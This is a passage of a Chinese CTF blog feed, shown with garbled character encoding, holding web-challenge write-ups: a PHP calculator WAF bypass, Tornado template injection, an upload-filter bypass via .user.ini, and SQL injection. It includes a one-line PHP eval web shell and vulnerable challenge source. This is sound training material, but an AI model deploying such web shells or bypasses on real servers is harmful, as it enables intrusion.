class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿›å…¥phpinfoçœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456509.png" alt="QQæˆªå›¾20220227144911"></p><p>æ„é€ ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456115.png"></p><p>&#x2F;d0g3_fllllllagï¼ˆå°†å…¶base64ï¼‰æ³¨æ„è¦åŠ ä¸Š<code>/</code>,å¼„äº†æˆ‘åŠå¤©ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456746.png" alt="QQæˆªå›¾20220227145447"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2022/02/27/BUUCTF/"/>
    <url>/2022/02/27/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><p>æœ‰ç‚¹ä¹±ï¼Œä¹‹å‰åœ¨ç­‰åšå®¢å¼€é€šã€‚</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>é…ç½®äº†å¥½ä¹…çš„å›¾åºŠï¼Œä¹‹å‰ç”¨hexo+githubçš„æœåŠ¡å™¨æ­å»ºåšå®¢ã€‚ç°åœ¨é‡æ–°ç”¨vpsæ­å»ºåšå®¢ï¼Œæ˜¯çœŸçš„éº»çƒ¦ï¼Œè¿˜è¦ç”³è¯·å¤‡æ¡ˆå•¥çš„ã€‚<br>ç»™è‡ªå·±å–äº†ä¸€ä¸ªå¥½å¬çš„idåâ€”-Xsw6_aï¼Œä½†æ˜¯å¾ˆéš¾å—ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™ä¸‹åˆ’çº¿(_)ï¼Œæ˜¯éæ³•å­—ç¬¦ã€‚<br>å…ˆæ¥åšåšè¿™ä¸ªæ¯”è¾ƒç®€å•çš„é¢˜å˜¿å˜¿ã€‚<br>emmmåˆè¦é‡æ–°å¯åŠ¨ä¸€ä¸‹ç¯å¢ƒã€‚<br>å…ˆæ¥çœ‹çœ‹æºä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209579.png" alt="QQæˆªå›¾20220214131745"></p><p>å€¼å¾—æ³¨æ„çš„å‡ ç‚¹ã€‚<br><strong>1.Iâ€™ve set up WAF to ensure security.</strong></p><p><strong>2.calc.php</strong></p><p>è¿›å…¥é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a></p><p>è¯»å–ä»£ç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214132112.png" alt="QQæˆªå›¾20220214132112"></p><p>è¿™é‡Œå¯¹æˆ‘æ¥è¯´çš„æ–°çŸ¥è¯†ï¼Œäº†è§£ä¸€ä¸‹foreachå‡½æ•°ã€‚ï¼ˆèœé¸Ÿæ•™ç¨‹ï¼‰<br>æ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ã€‚<br>æ„é€ num&#x3D;print_r(scandir(chr(47))),å‘ç°æŠ¥é”™ã€‚<br>emmmâ€¦.ä¸ä¼šäº†ã€‚ç™¾åº¦ã€‚<br>åªéœ€è¦å°†numä¹‹å‰æ‰“ä¸€ä¸ªç©ºæ ¼ã€‚<br>æ–°é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(scandir(chr(47)))<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209866.png" alt="QQæˆªå›¾20220214133023"></p><p>è¯»å–f1aggã€‚<br>è¿™é‡Œé™„ä¸Šå­—ç¬¦ä¸²è½¬asciiçš„javaä»£ç ï¼Œå°±å½“å¤ä¹ javaåŸºç¡€è¯­æ³•äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/f1agg&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length();i++)&#123;<br>            <span class="hljs-type">int</span> temp=(<span class="hljs-type">int</span>)a.charAt(i);<br>            <span class="hljs-comment">//å¾—åˆ°å½“å‰å­—ç¬¦çš„ascii</span><br>            System.out.println(temp);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæ•´é“¾æ¥ï¼š<a href="http://node4.buuoj.cn:27894/calc.php">http://node4.buuoj.cn:27894/calc.php</a>? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>å¾—åˆ°flagã€‚</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>éšä¾¿ç‚¹ç‚¹å‘ç°urlä¸­<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=7e8d78ce04c76c46dbe7fcee211c3aed</a><br>filehashçš„å€¼ï¼Œemmmç¬¬ä¸€çœ¼å°±è§‰å¾—æ˜¯åŠ å¯†ã€‚<br>æ¥ç€å‘ç°<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209280.png" alt="QQæˆªå›¾20220214134238"></p><p>ç›´æ¥ä¸ŠåŠ å¯†ã€‚<br>ä½†æ˜¯æ‰¾äº†ä¸€åœˆæ²¡æœ‰æ‰¾åˆ°cookieã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209059.png" alt="QQæˆªå›¾20220214134456"></p><p>å›å¤´åˆæƒ³åˆ°renderã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209239.png" alt="QQæˆªå›¾20220214135041"></p><p>æ²¡æœ‰æ€è·¯ï¼Œå°±åˆæŸ¥æ‰¾wpäº†ã€‚<br>å¾ˆå¥‡å¦™ï¼Œç«Ÿç„¶è”ç³»åˆ°é¢˜ç›®ã€‚è·Ÿç€wpæç¤ºåšä¸€ä¸‹ã€‚<br>ä¸€è·¯è·Ÿåˆ°åº•â€¦emmm<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209238.png" alt="QQæˆªå›¾20220214140206"></p><p><strong>æ€»ç»“ï¼šhandler æŒ‡å‘RequestHandler</strong></p><p><strong>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</strong></p><p><strong>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</strong></p><p>è¿™é‡Œå¦‚æœç›´æ¥è®¿é—®ï¼Œä¼šå‡ºç°500çš„é”™è¯¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220214140724.png" alt="QQæˆªå›¾20220214140724"></p><p>æ‰€ä»¥è¿™é‡Œå°±ä½“ç°å‡ºäº†ï¼Œä¸ºä»€ä¹ˆè¦é—´æ¥è®¿é—®ã€‚<br>ç„¶åè‡ªå·±è°ƒè¯•çš„ä¸€äº›é—®é¢˜ï¼šè¿™é‡Œå¥½åƒé“¾æ¥æ„é€ æˆï¼š0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81&#x2F;error?msg&#x3D;</p><p>msgåé¢è¾“å…¥ä»€ä¹ˆï¼Œé¡µé¢å°±ä¼šè¿”å›ä»€ä¹ˆã€‚è·Ÿä½œè€…è¯´çš„sstiæˆ‘è§‰å¾—æœ‰é—®é¢˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209416.png" alt="QQæˆªå›¾20220214141140"></p><p>è¿™é‡Œå¦‚æœæ˜¯è®¡ç®—è¡¨è¾¾å¼å°±æ˜¯ä¸è¡Œã€‚ä½†æ˜¯è¿™é‡Œç¡®å®æ˜¯ç¬¦åˆsstiï¼Œemmmä¸ç†è§£ã€‚</p><p>ç®¡ä»–å‘¢ï¼Œç»§ç»­åšå­ã€‚<br>æ„é€ é“¾æ¥ï¼š<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/error?msg=</a></p><p>å¾—åˆ°cookieï¼Œç„¶åå°±å»å†™ä»£ç å’¯ã€‚è‡ªå·±å¯¹ç€æ•²ä¸€éã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-comment">#åˆ›å»ºMD5åŠ å¯†å¯¹è±¡</span><br><span class="hljs-built_in">hash</span>.update(<span class="hljs-string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><span class="hljs-comment">#æ›´æ–°å¯¹è±¡è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè¦å…ˆUTF-8ç¼–ç æˆäºŒè¿›åˆ¶ï¼Œå› ä¸ºmd5åªåŠ å¯†äºŒè¿›åˆ¶</span><br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((<span class="hljs-string">&quot;20d70faf-6981-4604-ba00-9f57cb0c2569&quot;</span>+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br></code></pre></td></tr></table></figure><p>å°±æ˜¯æ³¨é‡Šmd5åŠ å¯†åˆå­¦åˆ°çŸ¥è¯†äº†ã€‚</p><p>æœ€ç»ˆé“¾æ¥:<a href="http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674">http://0ecb6975-05d4-486c-819b-733d862e600c.node4.buuoj.cn:81/file?filename=/fllllllllllllag&amp;filehash=cb968bb0bf9e59ccb66e18a9ed1a6674</a></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>1ã€å¦‚æœurlä¸­å‚æ•°å±è”½äº†å­—æ¯ï¼Œå¯åœ¨å‚æ•°å‰+ä¸€ä¸ªå°ç©ºæ ¼ã€‚</p><p>2ã€scandirã€print_fã€file_get_contentsç­‰å‡½æ•°</p><p>3ã€çœ‹åˆ°renderå‚æ•°å¯è”ç³»åˆ°æ¨¡æ¿ï¼Œè”ç³»åˆ°sstiï¼ŒTornadoæä¾›åˆ«åå¿«é€Ÿè®¿é—®å¯¹è±¡ã€‚</p><p>4ã€RequestHandler.application.settingsç›®å‰ä¸çŸ¥é“å…·ä½“ä½œç”¨ï¼Œä¸­æ–‡ç¿»è¯‘ä¸€ä¸‹  è¯·æ±‚å¤„ç†ç¨‹åº .ç”³è¯·.è®¾ç½® ä¼°æ‘¸è¿™å°±æ˜¯æŸ¥çœ‹cookieï¼Ÿ</p><p>å½“ç„¶è¿™é‡Œç›´æ¥é€šè¿‡ handler.settingsã€‚</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸Šä¼ æ–‡ä»¶ã€‚æœ‰æºç å…ˆçœ‹æºç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);<br>if (!file_exists($userdir)) &#123;<br>    mkdir($userdir, 0777, true);<br>&#125;<br>file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);<br>if (isset($_POST[&quot;upload&quot;])) &#123;<br>    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];<br>    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];<br>    if (!$tmp_name) &#123;<br>        die(&quot;filesize too big!&quot;);<br>    &#125;<br>    if (!$name) &#123;<br>        die(&quot;filename cannot be empty!&quot;);<br>    &#125;<br>    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);<br>    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;<br>        die(&quot;illegal suffix!&quot;);<br>    &#125;<br>    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;<br>        die(&quot;&amp;lt;? in contents!&quot;);<br>    &#125;<br>    $image_type = exif_imagetype($tmp_name);<br>    if (!$image_type) &#123;<br>        die(&quot;exif_imagetype:not image!&quot;);<br>    &#125;<br>    $upload_file_path = $userdir . &quot;/&quot; . $name;<br>    move_uploaded_file($tmp_name, $upload_file_path);<br>    echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;;<br>    echo &#x27;Your files : &lt;br&gt;&#x27;;<br>    var_dump(scandir($userdir));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209537.png" alt="QQæˆªå›¾20220222210628"></p><p>è¿‡æ»¤äº† <strong>&lt;?</strong><br>ç„¶åå¯ä»¥ä¸Šä¼ å›¾åƒç±»å‹çš„æ–‡ä»¶ã€‚<br>è¿™é‡Œå°±è®©æˆ‘æƒ³åˆ°äº†ä¸Šä¼ .htacessï¼Œä½†æ˜¯æ–‡ç« ä¸­ä¹Ÿæ˜¯è¿‡æ»¤æ‰äº†ã€‚<br>(è¿™é‡Œå°±èµ°å¤´æ— è·¯äº†ï¼Œçœ‹çœ‹wpï¼Œæç¤ºåˆ°apacheæ˜¯å¯ä»¥ç”¨.htacessï¼Œè€Œè¿™é‡Œç”¨çš„æœåŠ¡å™¨niginx)</p><p>ä¼˜åŠ¿ï¼šè·Ÿ<code>.htaccess</code>åé—¨æ¯”ï¼Œé€‚ç”¨èŒƒå›´æ›´å¹¿ï¼Œnginx&#x2F;apache&#x2F;IISéƒ½æœ‰æ•ˆï¼Œè€Œ<code>.htaccess</code>åªé€‚ç”¨äºapache</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209473.png" alt="QQæˆªå›¾20220222211627"></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®<code>php.ini</code>ä¸­<strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI è®¾ç½®ï¼Œè€Œä¸”åªè¦æ˜¯åœ¨ä½¿ç”¨ <strong>CGIï¼FastCGI</strong> æ¨¡å¼çš„æœåŠ¡å™¨ä¸Šéƒ½å¯ä»¥ä½¿ç”¨<code>.user.ini</code></p><p>åœ¨pç‰›çš„æ–‡ç« ä¸­æåˆ°äº†ä¸¤ä¸ªæœ‰è¶£çš„è®¾ç½®ï¼š<strong>auto_prepend_file</strong>å’Œ<strong>auto_append_file</strong></p><p>æˆ‘ä»¬å†åˆ°æ‰‹å†Œä¸­çœ‹äº†ä¸‹è¿™ä¸¤ä¸ªè®¾ç½®çš„å®šä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210762.png" alt="QQæˆªå›¾20220222212237"></p><p>å¤§è‡´æ„æ€å°±æ˜¯ï¼šæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼š<code>require(./a.jpg);</code>ï¼ˆè¿™é‡Œå°±æ˜¯ä¸ºä»€ä¹ˆè¦å†™å…¥è·Ÿä¸Šä¼ æ–‡ä»¶çš„å›¾ç‰‡ä¸€ä¸ªå‘½åçš„åŸå› ã€‚ï¼‰</p><p>è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äº<strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰ã€‚</p><h3 id="è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰"><a href="#è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰"></a>è§£é¢˜æ­¥éª¤ï¼ˆæ–¹æ³•ä¸€ï¼‰</h3><p>1ã€ä¸Šä¼ .user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></table></figure><p>2ã€ä¸Šä¼ a.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3ã€è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚<strong>upload&#x2F;md5(*)</strong><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261209510.png" alt="QQæˆªå›¾20220222212917"></p><p>å¾—åˆ°flagã€‚</p><h3 id="ç»•è¿‡exif-imagetype-çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰"><a href="#ç»•è¿‡exif-imagetype-çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰" class="headerlink" title="ç»•è¿‡exif_imagetype()çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰"></a>ç»•è¿‡<code>exif_imagetype()</code>çš„å¥‡æŠ€æ·«å·§ï¼ˆè§£é¢˜æ–¹æ³•äºŒï¼‰</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 10</span><br></code></pre></td></tr></table></figure><p>é‡‡ç”¨xbmæ ¼å¼X Bit Mapï¼Œç»•è¿‡exif_imagetype()æ–¹æ³•çš„æ£€æµ‹ï¼Œä¸Šä¼ æ–‡ä»¶æ¥è§£æã€‚<br> åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾ã€‚<br> XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆï¼Œå½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜.hæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚<br> ä¹Ÿå°±æ˜¯ç”¨cä»£ç æ¥æ ‡è¯†ä¸€ä¸ªxbmæ–‡ä»¶ï¼Œå‰ä¸¤ä¸ª#definesæŒ‡å®šä½å›¾çš„é«˜åº¦å’Œå®½åº¦ã€ä»¥åƒç´ ä¸ºå•ä½ï¼Œæ¯”å¦‚ä»¥ä¸‹xbmæ–‡ä»¶ï¼š<br> <code>#define test_width 16</code><br> <code>#define test_height 7</code></p><p>åªéœ€å°†ä¸Šè¿°æ–‡ä»¶ä¸­çš„GIF89aæ”¹ä¸º </p><p>#define width 20</p><p>#define height 10</p><p>å³å¯ã€‚</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>å°è¯•å¾ˆå¤šæ¬¡éƒ½æ˜¯å¤±è´¥ã€‚ç„¶åçªç„¶å‘ç°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210065.png" alt="QQæˆªå›¾20220223162344"></p><p>è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆç¼–ç å‘¢ï¼Ÿå°è¯•è®¸ä¹…ä¸çŸ¥é“ã€‚æŸ¥äº†æŸ¥wpã€‚æ˜¯base32ã€‚ç„¶åæ˜¯base64ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æ€è·¯ã€‚å› ä¸ºæ ¹æœ¬ç»•ä¸è¿‡ã€‚è‚¯å®šè¿˜æœ‰åˆ«çš„æ ¡éªŒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; <br>&lt;title&gt;Do you know who am I?&lt;/title&gt;<br>&lt;?php<br>require &quot;config.php&quot;;<br>require &quot;flag.php&quot;;<br><br>// å»é™¤è½¬ä¹‰<br>if (get_magic_quotes_gpc()) &#123;<br>function stripslashes_deep($value)<br>&#123;<br>$value = is_array($value) ?<br>array_map(&#x27;stripslashes_deep&#x27;, $value) :<br>stripslashes($value);<br>return $value;<br>&#125;<br><br>$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);<br>$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);<br>$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);<br>$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);<br>&#125;<br><br>mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);<br>$name = $_POST[&#x27;name&#x27;];<br>$password = $_POST[&#x27;pw&#x27;];<br>$t_pw = md5($password);<br>$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;<br>// echo $sql;<br>$result = mysqli_query($con, $sql);<br><br><br>if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;<br>die(&quot;do not hack me!&quot;);<br>&#125;<br>else&#123;<br>if (!$result) &#123;<br>printf(&quot;Error: %s\n&quot;, mysqli_error($con));<br>exit();<br>&#125;<br>else&#123;<br>// echo &#x27;&lt;pre&gt;&#x27;;<br>$arr = mysqli_fetch_row($result);<br>// print_r($arr);<br>if($arr[1] == &quot;admin&quot;)&#123;<br>if(md5($password) == $arr[2])&#123;<br>echo $flag;<br>&#125;<br>else&#123;<br>die(&quot;wrong pass!&quot;);<br>&#125;<br>&#125;<br>else&#123;<br>die(&quot;wrong 